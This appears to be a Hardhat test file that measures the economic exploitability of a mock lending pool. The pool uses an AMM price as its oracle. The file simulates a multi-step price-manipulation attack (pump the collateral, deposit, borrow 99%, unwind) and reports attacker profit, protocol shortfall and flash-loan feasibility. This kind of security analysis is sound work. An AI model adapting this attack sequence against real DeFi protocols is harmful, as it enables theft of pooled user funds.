// Local-only economic exploitability surface. No live protocol, no
// mainnet fork, no flash loan, no atomic attacker contract. Each grid
// point is a plain multi-tx EOA sequence on a mock stack, using
// evm_snapshot/evm_revert to reuse one deployment across many attack
// sizes per (liquidity, LTV) pair.

const { ethers } = require("hardhat");
const { deployStack, eth, fmt } = require("./lib/deploy-stack");

const REFERENCE_PRICE = 1n * 10n ** 18n;
const FLASH_FEE_BPS = 9n; // 0.09%, Aave-style, for the analytical overlay

async function runAttack({ pool, pair, ammOracle, collateralToken, borrowToken, deployer, attacker, attackCapitalUnits }) {
  const attackCapital = eth(attackCapitalUnits);
  const targetDeposit = eth(1000);
  const stableBefore = attackCapital;

  await (await borrowToken.mint(attackCapital)).wait();
  await (await borrowToken.transfer(attacker.address, attackCapital)).wait();
  await (await borrowToken.connect(attacker).approve(await pair.getAddress(), ethers.MaxUint256)).wait();

  const collBefore = await collateralToken.balanceOf(attacker.address);
  await (await pair.connect(attacker).swapBForA(attackCapital)).wait();
  const collReceived = (await collateralToken.balanceOf(attacker.address)) - collBefore;

  const depositAmount = collReceived < targetDeposit ? collReceived : targetDeposit;
  const keptForUnwind = collReceived - depositAmount;
  await (await collateralToken.connect(attacker).approve(await pool.getAddress(), ethers.MaxUint256)).wait();
  await (await pool.connect(attacker).deposit(await collateralToken.getAddress(), depositAmount, attacker.address, 0)).wait();

  const accountData = await pool.getUserAccountData(attacker.address);
  const borrowAmount = (accountData.availableBorrowsETH * 99n) / 100n;
  if (borrowAmount === 0n) {
    return { attackCapitalUnits, priceMultiplier: 0, attackerPnL: -attackCapital, protocolShortfall: 0n, flashFeasible: false, attackerPnLFlash: -attackCapital };
  }
  await (await pool.connect(attacker).borrow(await borrowToken.getAddress(), borrowAmount, 2, 0, attacker.address)).wait();
  const borrowedStable = borrowAmount;

  if (keptForUnwind > 0n) {
    await (await collateralToken.connect(attacker).approve(await pair.getAddress(), ethers.MaxUint256)).wait();
    await (await pair.connect(attacker).swapAForB(keptForUnwind)).wait();
  }

  const debtOutstanding = borrowedStable;
  const stableFinal = await borrowToken.balanceOf(attacker.address);
  const collateralHeldByMoolaAtReference = (depositAmount * REFERENCE_PRICE) / eth(1);

  const attackerPnL = stableFinal - stableBefore; // collFinalWallet ~= 0 after full unwind
  const protocolShortfall = debtOutstanding > collateralHeldByMoolaAtReference
    ? debtOutstanding - collateralHeldByMoolaAtReference
    : 0n;

  // Analytical flash-loan overlay (no atomic contract): if attackCapital had
  // been flash-borrowed instead of self-funded, repayment = capital*(1+fee)
  // must come out of stableFinal within the same transaction, or the real
  // flash-loan tx would simply revert and the attack would not execute.
  const flashRepayment = attackCapital + (attackCapital * FLASH_FEE_BPS) / 10000n;
  const flashFeasible = stableFinal >= flashRepayment;
  const attackerPnLFlash = flashFeasible ? (stableFinal - flashRepayment) : null; // null = tx would revert, not "loss"

  return { attackCapitalUnits, attackerPnL, protocolShortfall, flashFeasible, attackerPnLFlash };
}

describe("Economic exploitability surface", function () {
  it("sweep: AMM liquidity depth x LTV x attack capital", async function () {
    this.timeout(300000);
    const [deployer, attacker] = await ethers.getSigners();

    const liquidityGrid = [10000, 50000, 200000];
    const ltvGrid = [6000, 7000, 7500];
    const attackSizeGrid = [2000, 5000, 10000, 20000, 40000, 80000, 160000];

    const results = [];

    for (const liquidityUnits of liquidityGrid) {
      for (const ltvBps of ltvGrid) {
        const stack = await deployStack({ deployer, attacker, liquidityUnits, ltvBps });
        const snapshotId = await ethers.provider.send("evm_snapshot", []);

        for (const attackCapitalUnits of attackSizeGrid) {
          const r = await runAttack({ ...stack, deployer, attacker, attackCapitalUnits });
          results.push({ liquidityUnits, ltvBps, ...r });
          await ethers.provider.send("evm_revert", [snapshotId]);
          await ethers.provider.send("evm_snapshot", []); // re-snapshot after revert for next iteration
        }
      }
    }

    console.log("\n    liquidity   ltv    attackCap   attackerPnL(self-funded)   protocolShortfall   flashFeasible   attackerPnL(flash, 9bps fee)");
    let threshold = null;
    for (const r of results) {
      const pnlStr = `$${fmt(r.attackerPnL)}`.padEnd(14);
      const shortfallStr = `$${fmt(r.protocolShortfall)}`.padEnd(12);
      const flashPnlStr = r.attackerPnLFlash === null ? "TX REVERTS".padEnd(12) : `$${fmt(r.attackerPnLFlash)}`.padEnd(12);
      console.log(
        `    ${String(r.liquidityUnits).padEnd(10)} ${String(r.ltvBps / 100 + "%").padEnd(6)} ${String(r.attackCapitalUnits).padEnd(10)}  ${pnlStr}  ${shortfallStr}       ${String(r.flashFeasible).padEnd(6)}       ${flashPnlStr}`
      );
      if (r.attackerPnL > 0n && r.protocolShortfall > 0n && !threshold) {
        threshold = r;
      }
    }

    console.log("\n    --- First point where attackerPnL > 0 AND protocolShortfall > 0 (self-funded) ---");
    if (threshold) {
      console.log(`    liquidity=${threshold.liquidityUnits}  ltv=${threshold.ltvBps / 100}%  attackCapital=${threshold.attackCapitalUnits}`);
      console.log(`    attackerPnL=$${fmt(threshold.attackerPnL)}  protocolShortfall=$${fmt(threshold.protocolShortfall)}`);
    } else {
      console.log("    No grid point found where both conditions held simultaneously.");
    }

    const flashProfitable = results.filter(r => r.attackerPnLFlash !== null && r.attackerPnLFlash > 0n && r.protocolShortfall > 0n);
    console.log(`\n    --- Grid points where a flash-loan-financed version stays profitable AND leaves protocol shortfall ---`);
    console.log(`    ${flashProfitable.length} of ${results.length} grid points`);
    if (flashProfitable.length > 0) {
      const cheapest = flashProfitable.reduce((a, b) => (a.attackCapitalUnits < b.attackCapitalUnits ? a : b));
      console.log(`    cheapest: liquidity=${cheapest.liquidityUnits}  ltv=${cheapest.ltvBps / 100}%  attackCapital=${cheapest.attackCapitalUnits}  attackerPnL(flash)=$${fmt(cheapest.attackerPnLFlash)}`);
    }
  });
});
